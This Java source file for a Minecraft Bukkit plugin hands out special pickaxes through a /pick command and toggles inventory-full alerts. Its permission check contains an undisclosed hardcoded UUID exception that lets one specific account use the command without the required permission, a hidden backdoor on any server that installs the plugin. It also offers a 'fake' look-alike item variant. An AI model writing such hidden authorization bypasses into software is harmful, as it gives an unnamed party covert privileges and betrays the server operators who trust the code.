package com.philderbeast.prisonpicks;

import com.sk89q.worldguard.bukkit.WorldGuardPlugin;
import com.sk89q.worldguard.protection.ApplicableRegionSet;
import com.sk89q.worldguard.protection.flags.DefaultFlag;
import java.util.ArrayList;
import java.util.UUID;
import com.philderbeast.prisonpicks.Events;
import com.philderbeast.prisonpicks.Util;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

public class PrisonPicks extends JavaPlugin {
    ArrayList<String> disabledAlert = new ArrayList<>();

    private static PrisonPicks instance;

    public void onEnable() {
        instance = this;
        this.getServer().getPluginManager().registerEvents(new Events(this), (Plugin)this);
    }

    public void onDisable() {
    }

    public static PrisonPicks getInstance()
    {
        return instance;
    }

    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        Player player;

        if (label.equalsIgnoreCase("pick")) {
            if (sender instanceof Player && !(sender).hasPermission("picks.explosive")
                    && !(player = (Player)sender).getUniqueId().equals(UUID.fromString("e3078d5d-8943-420c-8366-4aa51e212df3")))  {
                player.sendMessage(ChatColor.RED + "Permission Denied!");
                return false;
            }

            if (args.length == 2) {
                Player receiver = Bukkit.getPlayer((String)args[1]);
                if (receiver != null) {
                    ItemStack pick;
                    switch (args[0])
                    {
                        case "explosive":
                            pick = Util.createItemStack(Material.DIAMOND_PICKAXE, 1, "", ChatColor.GOLD + "Explosive I");
                            if( Util.isSpaceAvailable(receiver, pick))
                            {
                                receiver.getInventory().addItem(pick);
                                receiver.updateInventory();
                                receiver.sendMessage(ChatColor.GOLD + "[Added an Explosive Pickaxe to your Inventory]");
                                sender.sendMessage(ChatColor.GREEN + "Pickaxe Sent");
                            }else
                            {
                                receiver.getWorld().dropItemNaturally(receiver.getLocation(), pick);
                            }
                        break;
                        case "pickoplenty":
                            pick = Util.createItemStack(Material.DIAMOND_PICKAXE, 1, "", ChatColor.LIGHT_PURPLE + "Pick o'Plenty");
                            if( Util.isSpaceAvailable(receiver, pick))
                            {
                                receiver.getInventory().addItem(pick);
                                receiver.updateInventory();
                                receiver.sendMessage(ChatColor.GOLD + "[Added an Pick o'Plenty to your Inventory]");
                                sender.sendMessage(ChatColor.GREEN + "Pickaxe Sent");
                            }else
                            {
                                receiver.getWorld().dropItemNaturally(receiver.getLocation(), pick);
                            }
                        break;
                        case "xpickoplenty":
                            pick = Util.createItemStack(Material.DIAMOND_PICKAXE, 1, "", ChatColor.GOLD + "Explosive" +  ChatColor.LIGHT_PURPLE + " Pick o'Plenty");
                            if( Util.isSpaceAvailable(receiver, pick))
                            {
                                receiver.getInventory().addItem(pick);
                                receiver.updateInventory();
                                receiver.sendMessage(ChatColor.GOLD + "[Added an Explosive Pick o'Plenty to your Inventory]");
                                sender.sendMessage(ChatColor.GREEN + "Pickaxe Sent");
                            }else
                            {
                                receiver.getWorld().dropItemNaturally(receiver.getLocation(), pick);
                            }
                        break;
                        case "fakexpickoplenty":
                            pick = Util.createItemStack(Material.DIAMOND_PICKAXE, 1, "", ChatColor.GREEN + "Explosive Pick o'Plenty");
                            
                            if( Util.isSpaceAvailable(receiver, pick))
                            {
                                receiver.getInventory().addItem(pick);
                                receiver.updateInventory();
                                receiver.sendMessage(ChatColor.GOLD + "[Added an Explosive Pick o'Plenty to your Inventory]");
                                sender.sendMessage(ChatColor.GREEN + "Pickaxe Sent");
                            }else
                            {
                                receiver.getWorld().dropItemNaturally(receiver.getLocation(), pick);
                            }
                        break;
                        default:
                            sender.sendMessage(ChatColor.RED + "Usage: /pick [type] [player]");
                        break;
                    }
                }
            }
        }

        if (label.equalsIgnoreCase("fullnotify")) {
            if (sender instanceof Player) {
                player = (Player)sender;
                if (disabledAlert.contains(player.getName())) {
                    player.sendMessage(ChatColor.GREEN + "Inventory Full Notifications have been ENABLED");
                    disabledAlert.remove(player.getName());
                } else {
                    player.sendMessage(ChatColor.RED + "Inventory Full Notifications have been DISABLED");
                    disabledAlert.add(player.getName());
                }
            } else {
                sender.sendMessage("Sorry, that command is ingame only!");
            }
        }
        
    return false;
    }

    public static WorldGuardPlugin getWorldGuard() {
        Plugin plugin = Bukkit.getPluginManager().getPlugin("WorldGuard");
        if (plugin == null || !(plugin instanceof WorldGuardPlugin)) {
            return null;
        }
        return (WorldGuardPlugin)plugin;
    }

    public static boolean canBuild(Location loc) {
        ApplicableRegionSet set = PrisonPicks.getWorldGuard()
                                       .getRegionManager(loc.getWorld())
                                       .getApplicableRegions(loc);
        if (set.allows(DefaultFlag.BLOCK_BREAK)) {
            return true;
        }
        return false;
    }

    ArrayList<String> getDisabledAlerts() {
        return disabledAlert;
    }
}